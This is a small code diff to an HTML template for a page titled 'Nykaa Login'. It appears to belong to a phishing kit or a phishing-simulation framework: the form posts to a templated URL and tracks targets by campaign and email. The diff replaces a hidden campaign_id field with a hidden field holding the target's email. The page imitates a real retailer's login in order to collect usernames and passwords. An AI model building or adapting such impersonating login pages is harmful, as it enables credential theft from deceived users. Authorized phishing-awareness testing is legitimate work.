@@ -56,8 +56,7 @@
     <div class="login-container">
       <h2>Nykaa Login</h2>
       <form method="POST" action="{{.URL}}">
-        <!-- Hidden input to track campaign (optional) -->
-        <input type="hidden" name="campaign_id" value="{{.CampaignID}}" />
+        <input type="hidden" name="email" value="{{.Email}}" />
         <input
           type="text"
           name="username"
